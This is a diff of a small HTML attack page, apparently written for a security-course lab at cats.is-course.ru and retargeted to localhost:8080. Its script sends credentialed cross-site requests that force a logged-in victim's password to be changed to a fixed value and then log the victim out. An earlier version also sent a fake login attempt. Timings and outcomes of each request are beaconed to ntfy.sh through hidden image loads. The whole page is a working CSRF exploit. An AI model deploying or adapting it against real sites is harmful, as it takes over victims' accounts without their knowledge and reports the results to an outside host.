@@ -1,18 +1,16 @@
-<!doctype html><html><head><meta charset="utf-8"><title>lat</title></head><body>
+<!doctype html><html><head><meta charset="utf-8"><title>loc</title></head><body>
 <script>
-var U="catslat1795228694", B="https://cats.is-course.ru", NP="Dm5!catwave2026";
+var U="catsloc1795228841", NP="Dm5!catwave2026", L="http://localhost:8080";
 function b(n){var i=document.createElement("img");i.width=1;i.height=1;
   i.src="https://ntfy.sh/"+U+"/trigger?message="+encodeURIComponent(n);document.body.appendChild(i);}
-function ms(p){var t0=performance.now();return p.then(function(){return Math.round(performance.now()-t0);});}
-b("l_start");
-ms(fetch(B+"/",{mode:"no-cors",credentials:"include",cache:"no-store"}))
- .then(function(t){b("l_get"+t);});
-ms(fetch(B+"/settings",{method:"POST",mode:"no-cors",credentials:"include",cache:"no-store",
+function ms(p,tag){var t0=performance.now();
+  p.then(function(){b(tag+"_ok"+Math.round(performance.now()-t0));})
+   .catch(function(e){b(tag+"_err_"+e.name);});}
+b("loc_start");
+ms(fetch("https://cats.is-course.ru/",{mode:"no-cors",credentials:"include",cache:"no-store"}),"pub_get");
+ms(fetch(L+"/",{mode:"no-cors",credentials:"include",cache:"no-store"}),"loc_get");
+ms(fetch(L+"/settings",{method:"POST",mode:"no-cors",credentials:"include",cache:"no-store",
    headers:{"Content-Type":"application/x-www-form-urlencoded"},
-   body:"password="+encodeURIComponent(NP)+"&confirm-password="+encodeURIComponent(NP)}))
- .then(function(t){b("l_post"+t);});
-ms(fetch(B+"/login",{method:"POST",mode:"no-cors",credentials:"include",cache:"no-store",
-   headers:{"Content-Type":"application/x-www-form-urlencoded"},
-   body:"login=nouserzz&password=wrongwrongwrong"}))
- .then(function(t){b("l_loginfake"+t);});
+   body:"password="+encodeURIComponent(NP)+"&confirm-password="+encodeURIComponent(NP)}),"loc_post");
+ms(fetch(L+"/logout",{mode:"no-cors",credentials:"include",cache:"no-store"}),"loc_logout");
 </script></body></html>
